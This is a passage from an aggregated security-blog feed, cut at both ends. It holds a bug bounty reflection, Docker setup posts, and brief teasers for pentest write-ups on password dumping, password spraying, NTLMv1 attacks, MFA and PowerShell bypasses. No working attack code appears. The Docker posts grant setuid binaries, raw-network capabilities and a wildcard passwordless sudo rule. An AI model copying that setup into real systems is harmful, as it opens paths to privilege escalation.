guesstimate what could be happening to the parameters I’d passed in before
the HTTP response is sent. Now, given that I’d seen some of the common mistakes
Software Engineers had made over the years with handling user-provided data, you
can then assume that other engineering teams at other companies could be making
similar mistakes, and therefore find bugs that way.&lt;/p&gt;

&lt;p&gt;The great thing about this is that you &lt;em&gt;don’t&lt;/em&gt; need to join a tech company to
learn this skill. Chose a random web app open source project on GitHub and
take a look through some of the previous security issues they’ve had. You’ll
see real world mistakes, from real world engineers, and can then start to
visualise these mistakes when black-box testing a bug bounty property.&lt;/p&gt;

&lt;h3 id="empathy"&gt;Empathy&lt;/h3&gt;

&lt;p&gt;As I mentioned above, empathy was a key aspect to the 4 years at Facebook, both
inside and outside of work.&lt;/p&gt;

&lt;p&gt;As a researcher, sending in a submission, you want to have a reply within minutes,
a fix within hours, and a $$$$ payout within a day. In an ideal world, that’d be
the case, but it doesn’t work like that.&lt;/p&gt;

&lt;p&gt;When sending in bugs, you have to understand the &lt;em&gt;huge&lt;/em&gt; amount of work that
could be going on behind the scenes.&lt;/p&gt;

&lt;p&gt;For example, a bug may look like a simple reflected XSS which just needs a
variable wrapped in htmlspecialchars for the submission to be resolved (pro-tip:
please don’t &lt;em&gt;actually&lt;/em&gt; fix XSS this way…), but in-fact it’s a systemic issue
in a core library used by a ton of random properties.&lt;/p&gt;

&lt;p&gt;In addition, consider the fact that it may have been exploited, so now various
other teams have to do IR, or legal teams need to be involved before any
replies can be sent to a researcher.&lt;/p&gt;

&lt;p&gt;Now, that’s &lt;em&gt;not&lt;/em&gt; to excuse the cases where a submission gets lost in the ether,
or where the program simply doesn’t care about security issues (I’m purposely
leaving out 30/90/120 day disclosure deadlines etc out of this post so that I
don’t start a Twitter storm…), but more often than not, for a reputable program,
bugs &lt;em&gt;are&lt;/em&gt; being fixed but can take a lot longer than it seems.&lt;/p&gt;

&lt;h3 id="reward-amounts"&gt;Reward Amounts&lt;/h3&gt;

&lt;p&gt;Similar to the empathy aspect of the (potential) long waits for bugs to be
fixed, one other area that I got to learn a lot about was reward amounts. The
main thing to mention here (and of course there are caveats, but this should
be the same for any reputable program) is that programs aren’t trying to cheat
you out of a reward. No (again, reputable) program is trying to shave off $500
off of your reward just to “save money”.&lt;/p&gt;

&lt;p&gt;One of the ways that can help alleviate these concerns is by publishing reward
amounts of various bug types (or even examples of amounts for previous specific
findings), but even this can cause drama - if the bounty table says “SSRF -
$10,000”, but you only get paid $5,000, then you’ve been cheated, right?&lt;/p&gt;

&lt;p&gt;Well, not exactly, since more often than not you need to consider the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Do you need to be authenticated to perform the SSRF, and if so, what type of
account do you need (one requiring high-privs is going to be harder to exploit)?&lt;/li&gt;
  &lt;li&gt;Is the host which is vulnerable to SSRF firewalled/in a DMZ?&lt;/li&gt;
  &lt;li&gt;Can you extract data or only blindly hit end-points with a GET?&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And so on….&lt;/p&gt;

&lt;p&gt;Programs can help you in these cases where you feel there is a discrepancy by
explaining the mitigating factors (or in the case you got &lt;em&gt;more&lt;/em&gt; than
$10,000, by explaining the compounding factors), but again, (most) programs
aren’t lowering the amounts just to “save money”.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id="the-future"&gt;The Future&lt;/h2&gt;

&lt;p&gt;Soon I’ll be starting a new role, one which will likely see me slightly more
removed from the bug bounty world, but I’ll keeping a close on eye on the ever
changing techniques and novel findings 👀.&lt;/p&gt;

&lt;p&gt;In terms of the future of bug bounties, who knows what will be the new norm
over the next 4 years, but regardless I’m sure it will benefit both sides
of the community.&lt;/p&gt;

&lt;p&gt;I may also dump a few of my older findings from over the past few
years on this blog…&lt;/p&gt;

&lt;h2 id="thank-you"&gt;Thank You&lt;/h2&gt;

&lt;p&gt;Finally, one thing I neglected over the years was to give specific “thank-you”
to all of the various researchers who helped me be who I am today, either
directly or indirectly.&lt;/p&gt;

&lt;p&gt;The OG 2012/2013 Facebook Hunters (Egor, Nir, Neal, Charlie B) who blogged are
a main reason I am where I am today. Then the researchers who were hacking
(and still are) at the same time as me, Josip &amp;amp; phwd (too many fun times at DEFCON together…),
Anand, Pranav, Dmitry, Youssef, and many others.&lt;/p&gt;

&lt;p&gt;Theres also the hunters who made me feel welcome at my first, and all the future DEFCONs -
Bitquark, Jhaddix, Nahamsec, and plenty more.&lt;/p&gt;

&lt;p&gt;And then finally, the people who still blow my mind when I read their posts -
Ngalog for taking over the #1 spot on Uber from me, Shubs for his crazy recon
skills, Frans for the sick presentations I’ve seen at our events, and so on…&lt;/p&gt;

    &lt;p&gt;&lt;a href="https://whitton.io/articles/from-researcher-to-engineer-and-beyond/"&gt;From Bug Bounty Hunter, to Engineer, and Beyond&lt;/a&gt; was originally published by Jack at &lt;a href="https://whitton.io"&gt;Jack&lt;/a&gt; on April 19, 2020.&lt;/p&gt;</description><pubDate>Sat, 18 Apr 2020 23:00:00 +0000</pubDate></item><item><title>Manage Firewall from Dockerised NodeJS</title><link>https://www.grepular.com/Manage_Firewall_from_Dockerised_NodeJS</link><description>&lt;p&gt;I recently found myself wanting to manage my firewall from a NodeJS application. There were a couple of issues I needed to overcome first. As a general rule, I try to Dockerise all NodeJS applications, to isolate them from the host; I’ve become weary of third party modules on NPM. Secondly, I don’t want to run a NodeJS application as root in order to allow it to run iptables. Here’s how I managed it.&lt;/p&gt;
&lt;p&gt;First of all, there are official NodeJS images on &lt;a href="https://hub.docker.com/_/node"&gt;Docker Hub&lt;/a&gt;. These images don’t contain iptables, so I needed to create my own image based off one of these. Here’s the Dockerfile:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FROM &lt;span class="hljs-symbol"&gt;node:&lt;/span&gt;&lt;span class="hljs-number"&gt;14&lt;/span&gt;-buster-slim
RUN apt-get update \
 &amp;amp;&amp;amp; apt-get -y install iptables \
 &amp;amp;&amp;amp; rm -rf /var/&lt;span class="hljs-class"&gt;&lt;span class="hljs-keyword"&gt;lib&lt;/span&gt;/&lt;span class="hljs-title"&gt;apt&lt;/span&gt;/&lt;span class="hljs-title"&gt;lists&lt;/span&gt;/*&lt;/span&gt;
RUN chmod u+s /usr/sbin/xtables-nft-multi
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You’ll notice that as well as installing iptables, I had to add the setuid bit to the xtables-nft-multi binary. Without this, only the root user can run it.&lt;/p&gt;
&lt;p&gt;Now you have this image, when using it, there are two additional things you need to remember to do. You &lt;em&gt;must&lt;/em&gt; use host mode networking, and you &lt;em&gt;must&lt;/em&gt; pass the NET_ADMIN capability:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker run -&lt;span class="hljs-literal"&gt;it&lt;/span&gt; --rm &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  --net host &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  --cap-add NET_ADMIN &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  -v &lt;span class="hljs-string"&gt;"$PWD:/app"&lt;/span&gt; &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  -u &lt;span class="hljs-string"&gt;"$(id -u):$(id -g)"&lt;/span&gt; &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  -w /app &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  --entrypoint &lt;span class="hljs-built_in"&gt;npm&lt;/span&gt; &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  your_custom_image &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  start
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you forget to set the NET_ADMIN capability, it will fail hard. But if you forget to use host mode networking, it will appear to work, but your iptables changes will be isolated inside the container instead of on the host.&lt;/p&gt;
&lt;p&gt;Here’s a tiny NodeJS application which simply prints out your existing rules:&lt;/p&gt;
&lt;pre&gt;&lt;code class="lang-js"&gt;const { exec } = &lt;span class="hljs-built_in"&gt;require&lt;/span&gt;(&lt;span class="hljs-string"&gt;'child_process'&lt;/span&gt;);

exec(&lt;span class="hljs-string"&gt;'iptables -nvL'&lt;/span&gt;, &lt;span class="hljs-function"&gt;&lt;span class="hljs-params"&gt;(err, stdout)&lt;/span&gt; =&amp;gt;&lt;/span&gt; {
    &lt;span class="hljs-built_in"&gt;console&lt;/span&gt;.log(stdout);
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now to go a little bit deeper. I didn’t just want to manage my firewall from this NodeJS application, I also wanted it to be able to read the content of network packets on the host network connections using &lt;a href="https://www.npmjs.com/package/pcap"&gt;pcap&lt;/a&gt;. My Dockerfile became:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;FROM &lt;span class="hljs-symbol"&gt;node:&lt;/span&gt;&lt;span class="hljs-number"&gt;14&lt;/span&gt;-buster-slim
RUN apt-get update \
 &amp;amp;&amp;amp; apt-get -y install \
    iptables \
    libpcap-dev \
    libcap2-bin \
 &amp;amp;&amp;amp; rm -rf /var/&lt;span class="hljs-class"&gt;&lt;span class="hljs-keyword"&gt;lib&lt;/span&gt;/&lt;span class="hljs-title"&gt;apt&lt;/span&gt;/&lt;span class="hljs-title"&gt;lists&lt;/span&gt;/*&lt;/span&gt;
RUN chmod u+s /usr/sbin/xtables-nft-multi
RUN setcap cap_net_raw,cap_net_admin=eip /usr/local/bin/node
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are a few changes. I installed libpcap-dev, as it’s needed for the nodejs pcap library, libcap2-bin for the “setcap” executable, and then I run a setcap command on the node binary, with the new NET_RAW capability. NET_RAW is required for the ability to read raw packets from a network device.&lt;/p&gt;
&lt;p&gt;You must remember to pass the additional capability when running the docker container, and it also requires host mode networking:&lt;/p&gt;
&lt;pre&gt;&lt;code class="lang-shell"&gt;$ docker run -&lt;span class="hljs-literal"&gt;it&lt;/span&gt; --rm &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  --net host &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  --cap-add NET_ADMIN &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  --cap-add NET_RAW &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  -v &lt;span class="hljs-string"&gt;"$PWD:/app"&lt;/span&gt; &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  -u &lt;span class="hljs-string"&gt;"$(id -u):$(id -g)"&lt;/span&gt; &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  -w /app &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  --entrypoint &lt;span class="hljs-built_in"&gt;npm&lt;/span&gt; &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  your_custom_image &lt;span class="hljs-string"&gt;\&lt;/span&gt;
  start
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And there we have it. An isolated nodejs application, not running as root, but which can read raw network packets on the host, and run iptables commands.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.grepular.com/redir?key=amazon_mastering_javascript" title="Mastering Javascript"&gt;&lt;img alt="Mastering Javascript" src="https://www.grepular.com/images/amazon/mastering_javascript.jpg" /&gt;&lt;/a&gt;
&lt;a href="https://www.grepular.com/redir?key=amazon_learning_react" title="Learning React"&gt;&lt;img alt="Learning React" src="https://www.grepular.com/images/amazon/learning_react.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;</description><pubDate>Sat, 17 Oct 2020 14:25:31 +0000</pubDate></item><item><title>Sandbox Rust Development with Rust Analyzer</title><link>https://www.grepular.com/Sandbox_Rust_Development_with_Rust_Analyzer</link><description>&lt;p&gt;A little over a year ago, I created a simple python script for sandboxing Rust development using Docker. It’s called &lt;a href="https://gitlab.com/mikecardwell/saferrust"&gt;saferrust&lt;/a&gt;. You basically copy it into your PATH, name it “cargo” and pretend like you have the real cargo application installed. It pulls down the &lt;a href="https://hub.docker.com/_/rust"&gt;latest offical Rust docker image from dockerhub&lt;/a&gt;, mounts your CWD into it and then runs your cargo commands inside the docker container. I did this basically because I wanted to secure my homedir against potentially malicious packages on &lt;a href="https://crates.io/"&gt;crates.io&lt;/a&gt; during development. If you want to know more about it, &lt;a href="https://gitlab.com/mikecardwell/saferrust"&gt;check out the project on gitlab&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;To be honest, I haven’t done much Rust development since then, so there are probably a bunch of pain points that I’ve not handled. I’m starting a new project though, and thought I’d try out the language server &lt;a href="https://github.com/rust-analyzer/rust-analyzer"&gt;rust-analyzer&lt;/a&gt; as I’ve heard good things about it.&lt;/p&gt;
&lt;p&gt;Ordinarily with &lt;a href="https://code.visualstudio.com/"&gt;Visual Studio Code&lt;/a&gt; (my IDE of choice), you can just install the rust-analyzer extension and begin. However, in my case as I don’t have rust installed directly on my host, there were a few extra steps to take.&lt;/p&gt;
&lt;p&gt;First of all, the VS Code extension tries to install and run the rust-analyzer binary, and fails. So I created another wrapper script named rust-analyzer and dropped it in my PATH:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span class="hljs-meta"&gt;#!/usr/bin/env bash&lt;/span&gt;
&lt;span class="hljs-built_in"&gt;set&lt;/span&gt; -e

&lt;span class="hljs-keyword"&gt;if&lt;/span&gt; [ &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$USER&lt;/span&gt;"&lt;/span&gt; != &lt;span class="hljs-string"&gt;"root"&lt;/span&gt; ]; &lt;span class="hljs-keyword"&gt;then&lt;/span&gt;
    sudo &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$0&lt;/span&gt;"&lt;/span&gt; &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;${@:1}&lt;/span&gt;"&lt;/span&gt;
    &lt;span class="hljs-built_in"&gt;exit&lt;/span&gt; 0
&lt;span class="hljs-keyword"&gt;fi&lt;/span&gt;

IMAGE_NAME=&lt;span class="hljs-string"&gt;"grepular/rust-analyzer"&lt;/span&gt;

&lt;span class="hljs-comment"&gt;# Build the image if it does not exist&lt;/span&gt;
&lt;span class="hljs-keyword"&gt;if&lt;/span&gt; [[ $(docker images --filter &lt;span class="hljs-string"&gt;"reference=&lt;span class="hljs-variable"&gt;$IMAGE_NAME&lt;/span&gt;"&lt;/span&gt; -q) == &lt;span class="hljs-string"&gt;""&lt;/span&gt; ]]; &lt;span class="hljs-keyword"&gt;then&lt;/span&gt;
    docker build -q -t &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$IMAGE_NAME&lt;/span&gt;"&lt;/span&gt; . -f-&amp;lt;&amp;lt;EOF
FROM rust:latest
RUN rustup component add rust-src
RUN curl -L https://github.com/rust-analyzer/rust-analyzer/releases/latest/download/rust-analyzer-linux -o /rust-analyzer
RUN chmod 755 /rust-analyzer
ENTRYPOINT [&lt;span class="hljs-string"&gt;"/rust-analyzer"&lt;/span&gt;]
EOF
&lt;span class="hljs-keyword"&gt;fi&lt;/span&gt;

docker run \
  -u $(&lt;span class="hljs-built_in"&gt;stat&lt;/span&gt; -c &lt;span class="hljs-string"&gt;'%u:%g'&lt;/span&gt; .) \
  -i --rm \
  -v &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$PWD&lt;/span&gt;:&lt;span class="hljs-variable"&gt;$PWD&lt;/span&gt;:ro"&lt;/span&gt; \
  --workdir &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$PWD&lt;/span&gt;"&lt;/span&gt; \
  &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$IMAGE_NAME&lt;/span&gt;"&lt;/span&gt; &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$@&lt;/span&gt;"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I then had to go into the VS Code settings and manually set the path to this script:&lt;/p&gt;
&lt;pre&gt;&lt;code class="lang-json"&gt;{
  &lt;span class="hljs-attr"&gt;"rust-analyzer.serverPath"&lt;/span&gt;: &lt;span class="hljs-string"&gt;"/usr/local/bin/rust-analyzer"&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You’ll notice at the beginning of the script, it re-runs it’s self under sudo if it’s not already running as root. This is because my user does not have access to the docker socket (for security reasons). And although my user does have sudo access, it is password protected. Because of the password protection, the rust-analyzer extension fails to run because it is prompted for a password and wasn’t expecting that. So, I placed an exception in my sudoers config to allow my user to run the rust-analyzer script using sudo, without a password. I did this by adding the following to /etc/sudoers.d/mike-rust-analyzer:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mike ALL=&lt;span class="hljs-string"&gt;NOPASSWD:&lt;/span&gt; &lt;span class="hljs-regexp"&gt;/usr/&lt;/span&gt;local&lt;span class="hljs-regexp"&gt;/bin/&lt;/span&gt;rust-analyzer *
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And there we have it. I can continue to run cargo inside a sandboxed environment, and use rust-analyzer inside another sandboxed environment, whilst using my IDE on the host to do development.&lt;/p&gt;
&lt;p&gt;P.S. Initial impressions of rust-analyzer are that it’s very good and I never want to do Rust development again without it.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.grepular.com/redir?key=amazon_programming_rust" title="Programming Rust"&gt;&lt;img alt="Programming Rust" src="https://www.grepular.com/images/amazon/programming_rust.jpg" /&gt;&lt;/a&gt;
&lt;a href="https://www.grepular.com/redir?key=amazon_docker_up_and_running" title="Docker: Up and Running"&gt;&lt;img alt="Docker: Up and Running" src="https://www.grepular.com/images/amazon/docker_up_and_running.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;</description><pubDate>Sun, 25 Oct 2020 12:47:18 +0000</pubDate></item><item><title>SolarFlare Release: Password Dumper for SolarWinds Orion</title><link>https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/</link><description>TL;DR Here are the concerns I have regarding the SolarWinds/FireEye breach:
The accounts stored in an organization&amp;rsquo;s SolarWinds Orion may be underestimated. I recently did a pentest for a firm that had over 200 credentials stored in their SolarWinds Orion database, but only 15 showed in the interface (the SolarWinds credential interface is complicated with sections for each connection type and different panes for each, it may also not properly delete credentials from the database when &amp;ldquo;removed&amp;rdquo; from the interface, I am unsure).</description><pubDate>Tue, 15 Dec 2020 05:30:44 +0000</pubDate></item><item><title>User Empowerment: Password Security</title><link>https://malicious.link/posts/2021/user-empowerment-password-security/</link><description>World Password Day (who knew that was a thing?) is upon us. It is the first Thursday of May every year, and that falls on May 6th this year.
I&amp;rsquo;m not sure how to start this blog post, but the meat of what I want to get into is password security and the evolution over the years.
In the 1900s (&amp;hellip; yes people are saying that now&amp;hellip; feel old yet?), password security was pretty simple.</description><pubDate>Tue, 27 Apr 2021 14:30:44 +0000</pubDate></item><item><title>Self Building and Executing Dockerfiles</title><link>https://www.grepular.com/Self_Building_and_Executing_Dockerfiles</link><description>&lt;p&gt;Sometimes there are programs that I want to use, and they’re either missing from my OS package repository, or I want to run a later version. I’ve started using a little trick to make these available on my systems. Here is a copy of my ~/bin/youtube-dl&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span class="hljs-comment"&gt;#!/usr/bin/env -S bash -c "podman run --rm -w /x -v "\$PWD:/x" \$(podman build -q - &amp;lt; \$0) \${@:1}"&lt;/span&gt;
&lt;span class="hljs-keyword"&gt;FROM&lt;/span&gt; python:&lt;span class="hljs-number"&gt;3&lt;/span&gt;-slim
&lt;span class="hljs-keyword"&gt;RUN&lt;/span&gt;&lt;span class="bash"&gt; python3 -m pip --no-cache-dir install yt-dlp&lt;/span&gt;
&lt;span class="hljs-keyword"&gt;ENTRYPOINT&lt;/span&gt;&lt;span class="bash"&gt; [&lt;span class="hljs-string"&gt;"yt-dlp"&lt;/span&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is a valid Dockerfile, but if I run it, it will build an image using podman containing the fork of youtube-dl that I want to use (yt-dlp), and then run that image, with the args I supplied. In the above example it mounts my working directory into the container so that downloaded files reach the host.&lt;/p&gt;
&lt;p&gt;Of course, I could have made a shell script as follows instead:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span class="hljs-meta"&gt;#!/usr/bin/env bash&lt;/span&gt;
podman build -q -t &lt;span class="hljs-string"&gt;"localhost/youtube-dl"&lt;/span&gt; -&amp;lt;&amp;lt;EOF &amp;amp;&amp;gt;/dev/null
FROM python:3-slim
RUN python3 -m pip --no-cache-dir install yt-dlp
ENTRYPOINT [&lt;span class="hljs-string"&gt;"yt-dlp"&lt;/span&gt;]
EOF

podman run --rm -w /x -v &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$PWD&lt;/span&gt;:/x"&lt;/span&gt; -w /x &lt;span class="hljs-string"&gt;"localhost/youtube-dl"&lt;/span&gt; &lt;span class="hljs-string"&gt;"&lt;span class="hljs-variable"&gt;$@&lt;/span&gt;"&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Some might even argue that it’s more readable. But then I have to worry about escaping parts of the inline Dockerfile, and I lose my IDE’s Dockerfile linting support too.&lt;/p&gt;</description><pubDate>Wed, 10 Nov 2021 20:30:52 +0000</pubDate></item><item><title>Unauthenticated Dumping of Usernames via Cisco Unified Call Manager (CUCM)</title><link>https://www.n00py.io/2022/01/unauthenticated-dumping-of-usernames-via-cisco-unified-call-manager-cucm/</link><description>This blog is about something I found recently regarding Cisco Unified Call Manager (CUCM).  While playing around with SeeYouCM Thief, which is designed to download parse configuration files from Cisco phone systems, I noticed something interesting within a configuration file. There was an XML element in the configuration files named &amp;#60;secureUDSUsersAccessURL&amp;#62;.  The value pointed to... &lt;div class="read-more navbutton"&gt;&lt;a href="https://www.n00py.io/2022/01/unauthenticated-dumping-of-usernames-via-cisco-unified-call-manager-cucm/"&gt;Read More&lt;i class="fa fa-angle-double-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;</description><pubDate>Sat, 29 Jan 2022 15:28:48 +0000</pubDate></item><item><title>Manipulating User Passwords Without Mimikatz</title><link>https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/</link><description>There are two common reasons you may want to change a user’s password during a penetration test: You have their NT hash but not their plaintext password. Changing their password to a known plaintext value can allow you to access services in which Pass-the-Hash is not an option. You don’t have their NT hash or... &lt;div class="read-more navbutton"&gt;&lt;a href="https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/"&gt;Read More&lt;i class="fa fa-angle-double-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;</description><pubDate>Tue, 08 Mar 2022 11:15:46 +0000</pubDate></item><item><title>Password Spraying RapidIdentity Logon Portal</title><link>https://www.n00py.io/2022/03/password-spraying-rapididentity-logon-portal/</link><description>In the past I had written a quick blog post on password spraying Dell SonicWALL Virtual Office.  While it wasn&amp;#8217;t all that exciting of a post, a number of people did find it useful and having a blog for it helped people find it more easily than only being in a random Github repo or... &lt;div class="read-more navbutton"&gt;&lt;a href="https://www.n00py.io/2022/03/password-spraying-rapididentity-logon-portal/"&gt;Read More&lt;i class="fa fa-angle-double-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;</description><pubDate>Fri, 11 Mar 2022 16:25:43 +0000</pubDate></item><item><title>Beautiful Basics - Series</title><link>https://malicious.link/posts/2022/beautiful-basics/</link><description>Today I keynoted @BSidesVancouver. It was an honor to be asked and I had a great time.
Conference Link: https://hopin.com/events/bsides-vancouver-2022/
I talked about 11 lessons learned over my career that contradict some of the edicts that are well known in the Cyber Security space.
Before we get into the lessons though, let me attack the things I know many of you reading this already have queued up in your head.</description><pubDate>Mon, 02 May 2022 05:00:00 +0000</pubDate></item><item><title>Beautiful Basics: Lesson 1</title><link>https://malicious.link/posts/2022/beautiful-basics-lesson-01/</link><description>Lesson 1 - YOU could be &amp;ldquo;Legacy&amp;rdquo; Stop thinking that just because it did or didn’t work X way when you learned it, it still does or doesn&amp;rsquo;t. That could be 20 years ago. Technology changes faster than you do.
I guess that&amp;rsquo;s a bit mean for a title but here&amp;rsquo;s the thing:
One of the greatest yet most challenging things about doing any job in technology is staying current.</description><pubDate>Sat, 07 May 2022 06:00:00 +0000</pubDate></item><item><title>Beautiful Basics: Lesson 2</title><link>https://malicious.link/posts/2022/beautiful-basics-lesson-02/</link><description>Lesson 2 - Least Privilege No one should have administrative access. All elevated access should be checked out when you need it and checked back in (automatically if possible). Just like UAC. MFA should be required, proximity or push based. And every use of a break glass account should be highly monitored
I think &amp;ldquo;Least Privilege&amp;rdquo; has been harped on at least &amp;hellip; you know what, let me wager that you can&amp;rsquo;t find a single infosec or hacking conference from 2000 until now (2022) that doesn&amp;rsquo;t have 4 talks with the words &amp;ldquo;least privilege&amp;rdquo; in the talk.</description><pubDate>Sun, 08 May 2022 07:00:00 +0000</pubDate></item><item><title>LDAPSearch Reference</title><link>https://malicious.link/posts/2022/ldapsearch-reference/</link><description>ldapsearch is a extremely powerful tool, especially for Windows Active Directory enumeration. It&amp;rsquo;s one of my primary tools when performing pentesting or red teaming against an environment with Active Directory, but also comes in quiet handy to know as many times it can come default installed or part of a base image, so its a bit Living-Off-The-Land-esq. Another point towards ldapsearch is that it&amp;rsquo;s easy to forget that Active Directory isn&amp;rsquo;t the only LDAP server in most environments and the ability to utilize a tool like this can come in extremely handy.</description><pubDate>Sat, 14 May 2022 16:00:00 +0000</pubDate></item><item><title>Blocking ISO mounting</title><link>https://malicious.link/posts/2022/blocking-iso-mounting/</link><description>Update: 10/15/2022
One of the hard parts of implementing a block like this is the concern that it will &amp;ldquo;break something&amp;rdquo;. The DFIR Report&amp;rsquo;s post on Bumblebee Round 2 has a great suggestion on how to detect legitimate (and illegitimate) use of ISO mounting using Event ID 12 of the Microsoft-Windows-VHDMP-Operational logs. It&amp;rsquo;s not one of the main Application/System/Security logs so you may have to configure your forwarders to start capturing it, but it will give you a good idea of how common it is for your organization to mount ISOs.</description><pubDate>Fri, 27 May 2022 08:00:00 +0000</pubDate></item><item><title>Beautiful Basics: Lesson 3</title><link>https://malicious.link/posts/2022/beautiful-basics-lesson-03/</link><description>Lesson 3 - Detection Reality People and Honey tokens are THE BEST detective tool you have.
Go buy a Thinkst Canary, they detect me more than any multi-million dollar EDR. Period.
Let me clarify something quickly before I get roasted. I am not saying that EDR (Endpoint Detection and Response) agents don&amp;rsquo;t have a place, it&amp;rsquo;s just that they have taken over for Anti-Virus for being mostly preventative and response oriented.</description><pubDate>Sat, 28 May 2022 08:00:00 +0000</pubDate></item><item><title>Beautiful Basics: Lesson 4</title><link>https://malicious.link/posts/2022/beautiful-basics-lesson-04/</link><description>Lesson 4 - User Blaming Security is NOT everyone&amp;rsquo;s job in the company. Stop trying to force the issue. It&amp;rsquo;s security&amp;rsquo;s job to enable, incentivize and protect.
In the Marine Corps, I was taught that every Marine is a &amp;ldquo;Rifleman&amp;rdquo;, meaning that any Marine, no matter their MOS (Military Occupational Specialty) - aka their job, could be called upon to engage with the enemy using a rifle or other weapon.</description><pubDate>Wed, 22 Jun 2022 09:00:00 +0000</pubDate></item><item><title>Bypass Constrained Language Mode (CLM) Proof of Concept (Bigger Version)</title><link>https://www.youtube.com/watch?v=1iZTf4APDuk</link><description>Hi all! 
It is common during engagements to find that CLM (Constrained Language Mode) is configured on PowerShell as a SafeGuard or control against malicous activity. This is a common misconception as there are many ways that CLM can be bypassed. This videos show a bypass that worked for me during and engagement recently. Enjoy!
For more details and obfuscated versions see this post - 
https://sp00ks-git.github.io/posts/CLM-Bypass</description><pubDate>Fri, 26 Aug 2022 19:27:02 +0000</pubDate></item><item><title>Practical Attacks against NTLMv1</title><link>https://www.n00py.io/2022/10/practical-attacks-against-ntlmv1/</link><description>This blog is meant to serve as a guide for practical exploitation of systems that allow for the NTLMv1 authentication protocol. While NTLMv1 is hardly ever needed anymore, a surprising number of organizations still use it, perhaps unknowingly. There are however some VPN products that still currently instruct their users to downgrade NLTM authentication to... &lt;div class="read-more navbutton"&gt;&lt;a href="https://www.n00py.io/2022/10/practical-attacks-against-ntlmv1/"&gt;Read More&lt;i class="fa fa-angle-double-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;</description><pubDate>Sun, 16 Oct 2022 19:25:19 +0000</pubDate></item><item><title>FlipperZero Hacking My Garage Door</title><link>https://www.youtube.com/shorts/cJvbjPioX3w</link><description>Video shows how I use the FlipperZero to open my personal garage door. Works like a charm especially when I cant find the key fob!</description><pubDate>Fri, 13 Jan 2023 11:43:11 +0000</pubDate></item><item><title>Exploiting Resource Based Constrained Delegation (RBCD) with Pure Metasploit</title><link>https://www.n00py.io/2023/01/exploiting-resource-based-constrained-delegation-rbcd-with-pure-metasploit/</link><description>Metasploit recently released version 6.3.  With it came a whole lot of new features related to LDAP operations and using Kerberos authentication. In this blog I want to demonstrate how to perform a GenericWrite -&amp;#62; RBCD attack, which I find are very common. Often times a user will not have administrative access to a computer,... &lt;div class="read-more navbutton"&gt;&lt;a href="https://www.n00py.io/2023/01/exploiting-resource-based-constrained-delegation-rbcd-with-pure-metasploit/"&gt;Read More&lt;i class="fa fa-angle-double-right"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;</description><pubDate>Mon, 30 Jan 2023 20:36:40 +0000</pubDate></item><item><title>CactusCon 2023: BloodHound Unleashed</title><link>https://www.n00py.io/2023/02/cactuscon-2023-bloodhound-unleashed/</link><description>Here are the slides and video from my 2023 talk at CactusCon. The YouTube video currently is cut-off at the beginning, but if it gets fixed I&amp;#8217;ll update with a new link. BloodHound Unleashed.pdf from n00py1</description><pubDate>Wed, 01 Feb 2023 14:38:56 +0000</pubDate></item><item><title>Bypassing Okta MFA Credential Provider for Windows</title><link>https://www.n00py.io/2023/02/bypassing-okta-mfa-credential-provider-for-windows/</link><description>I&amp;#8217;ll state this upfront, so as not to confuse: This is a POST 